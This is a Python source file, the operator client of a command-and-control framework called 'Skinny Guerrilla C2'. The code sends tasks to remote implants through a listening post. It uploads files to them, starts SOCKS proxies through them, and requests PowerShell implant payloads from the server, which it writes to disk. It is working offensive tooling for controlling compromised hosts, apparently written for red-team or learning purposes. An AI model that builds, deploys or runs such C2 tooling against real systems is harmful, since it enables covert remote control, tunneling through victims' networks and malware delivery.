###############################################################################
#                          SKINNY GUERRILLA C2 CLIENT                          
#     _____ _    _                      _____                      _ _ _       
#    / ____| |  (_)                    / ____|                    (_) | |      
#   | (___ | | ___ _ __  _ __  _   _  | |  __ _   _  ___ _ __ _ __ _| | | __ _ 
#    \___ \| |/ / | '_ \| '_ \| | | | | | |_ | | | |/ _ \ '__| '__| | | |/ _` |
#    ____) |   <| | | | | | | | |_| | | |__| | |_| |  __/ |  | |  | | | | (_| |
#   |_____/|_|\_\_|_| |_|_| |_|\__, |  \_____|\__,_|\___|_|  |_|  |_|_|_|\__,_|
#                               __/ |                                          
#                              |___/                                           
# SGCC Client python file
# client.py
# This file acts as a command line interface for users to send get and posts 
# requests to the server. This allows us to remotely store tasks in the sqlite
# database and remotely query it to get the results.
#
# inspired by https://github.com/shogunlab/building-c2-implants-in-cpp
# modified by JCSteiner

############################## LOADS DEPENDENCIES #############################

# click is used to add command line arguments to our files
import click
# requests is used to make get and post requests to the server
import requests
# datetime is to get the current date and time in a formatted way, timezone is 
# used to make sure that we store data as zulu time for consistency.
from datetime import datetime, timezone

# used to get the current time
import time

######################## GLBOAL FUNCTIONS AND VARIABLES #######################

# parses c2 conf settings
c2_settings = dict()
infile = open('../Server/c2_settings.conf')
for line in infile:
    line = line.strip()
    key, val = line.split(',')
    c2_settings[key] = val

# for now leaving this globally declared. this is the ip and port of the server
listening_post_addr = f'http://{c2_settings["ip"]}' # ENTER IP:FLASK_PORT

# define a helper functionsto make a get request
def api_get_request(endpoint):
    response_raw = requests.get(listening_post_addr + endpoint, verify=False).text
    return response_raw

# define a helper function to make a post request
def api_post_request(endpoint, payload):
    response_raw = requests.post(listening_post_addr + endpoint, data=payload, verify=False).text
    return response_raw


#################### DEFINES COMMAND LINE ARGS & FUNCTIONS ####################

# CLI commands and logic
@click.group()
def cli():
    pass
    
############################# GET-HISTORY COMMAND #############################

# what to run if we use "get-history"
@click.command(name="get-history")
# makes a get request to /history and prints. prints all tasks.
def list_history():
    """List the history of tasks and their associated results."""
    api_endpoint = "/history"
    print(api_get_request(api_endpoint))
    
############################## POST-TASKS COMMAND #############################

# what to run if we use "post-tasks"
@click.command(name="post-tasks")
# you'll need to specify -i, which is which implant to target by ID
@click.option('-i', help='Which implant to target.')
# you'll need to specify -t (in quotes preferred) which is what task to run
# it'll separate option by a space with the task 
@click.option('-t', help='Which command to run.')
def add_tasks(i, t):
    """Submit tasks to the listening post."""
    api_endpoint = f"/{c2_settings['task_uri']}/{i}"

    # splits the task by space
    t = t.split()
    # if there was at least one word supplied to the task string
    if len(t) > 0:

        # tries to join subsequent arguments by semi-colon (implant will parse)
        try:
            o = ';'.join(t[1:])
        # if that command gets an index error. set the option variable to be nothing
        except:
            o = ''

        # gets current zulu time
        time = datetime.now(timezone.utc)

        # combines the arguments as a comma-separated value string. 
        request_payload_string = f'{t[0]},{o},{time}'

        # if the command was to upload
        if t[0] == 'upload':


            local_file = o.split(';')[0]

            # opens the local file to upload, and sends its data to the server
            infile = open(local_file, 'rb')
            file = infile.read()
            infile.close()
            api_post_request(f'/{c2_settings['upload_uri']}/{i}', file)

            # discard local file as an argument
            o = o.split(';')[1]
            request_payload_string = f'{t[0]},{o},{time}'

        # if we are starting a socks proxy
        elif t[0] == 'socks-start':

            # if we're starting our sockserver, make a request to start a socks server
            # for the given implant
            api_post_request(f'/socks/{i}', f'start {o}')

            # parses the port to call back to
            handler_port = o.split(';')[0]

            # overwrites this request string with an easier to parse thing
            request_payload_string = f'socks,{handler_port},{time}'

        # if we are stopping a socks proxy
        elif t[0] == 'socks-stop':

            # if we're stopping the socksserver, make a request to stop a socks server
            api_post_request(f'/socks/{i}', f'stop {0}')
            return ''

    
        # posts our task string to the server
        api_post_request(api_endpoint, request_payload_string.encode())

        
        # prints out what was sent to the server, for debugging and info purposes.
        # didn't use the variable because it would've been a lot of extra typing, but that
        # would be better...
        print('Sent the following task the server:\n',
            '[task type]\t[task options]\t[implant id]\t [task time]\n', 
            f'{t[0]}\t\t{o}\t\t{i}\t\t{time}\n')

############################## NEW-IMPLANT COMMAND ############################


# what to run if we use "new-implant"
@click.command(name="new-implant")
# you'll need to specify -f, which is the format the implant is generated with
@click.option('-f', help='Format of the implant.')
# the file path that we want to write the payload to
@click.option('-o', help='The filepath that we will write the payload to.')
@click.option('-c', help='The commands to include in the implant after creation.')
def new_implant(f, o, c):

    # initializes the sub uri of /implant that we will go to as an empty string
    # this accounts for if we can't find the format we want in the if/else below
    parsed_format = ""
    
    # if we choose the powershell format, set parsed_format accordingly
    if f.lower() == 'powershell' or f.lower() == 'ps':
        parsed_format = 'ps'

    # client makes post request to /implant with format in the body
    api_post_request(f'/implant/{parsed_format}', c.encode())

    # sleeps to allow time for the server to do its thing and not put in a race condition here
    time.sleep(2)

    # gets the payload that the server has most recently created for this format. should be ours
    payload = api_get_request(f'/implant/{parsed_format}')

    # writes the payload to a file
    outfile = open(o, 'w')
    outfile.write(payload)
    outfile.close()


################################# MANAGE ARGS #################################


# does the final step of adding our functions to the cli
cli.add_command(list_history)
cli.add_command(add_tasks)
cli.add_command(new_implant)


##################################### MAIN ####################################
if __name__ == '__main__':
    cli()
